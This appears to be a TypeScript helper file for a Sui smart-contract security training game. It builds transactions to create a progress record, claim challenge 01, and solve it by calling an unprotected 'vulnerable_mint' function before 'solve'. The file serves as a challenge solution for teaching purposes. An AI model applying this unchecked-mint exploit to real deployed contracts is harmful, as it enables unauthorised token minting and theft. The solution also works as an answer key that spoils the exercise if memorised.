import { Transaction } from "@mysten/sui/transactions";

export function createProgressTransaction(packageId: string): Transaction {
  const tx = new Transaction();
  tx.moveCall({
    target: `${packageId}::user_progress::create`,
  });
  return tx;
}

export function claimChallenge01Transaction(packageId: string, progressId: string): Transaction {
  const tx = new Transaction();
  tx.moveCall({
    target: `${packageId}::challenge_01_anyone_can_mint::claim`,
    arguments: [tx.object(progressId)],
  });
  return tx;
}

export function solveChallenge01Transaction(packageId: string, progressId: string, instanceId: string): Transaction {
  const tx = new Transaction();
  const progress = tx.object(progressId);
  const instance = tx.object(instanceId);

  tx.moveCall({
    target: `${packageId}::challenge_01_anyone_can_mint::vulnerable_mint`,
    arguments: [instance, tx.pure.u64(1_000)],
  });
  tx.moveCall({
    target: `${packageId}::challenge_01_anyone_can_mint::solve`,
    arguments: [instance, progress],
  });

  return tx;
}

